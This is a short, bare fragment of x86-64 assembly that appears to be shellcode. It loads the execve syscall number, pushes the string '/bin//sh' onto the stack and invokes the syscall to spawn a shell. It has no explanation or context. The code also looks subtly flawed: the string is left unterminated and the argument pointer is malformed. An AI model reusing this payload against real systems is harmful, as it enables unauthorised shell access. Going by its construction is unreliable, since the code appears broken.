xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
xor edi, edi
push 0x3a
pop rax         
inc eax          
movabs rbx, 0x68732f2f6e69622f
push rbx         
mov rdi, rsp     
push rax         
mov rsi, rsp    
syscall
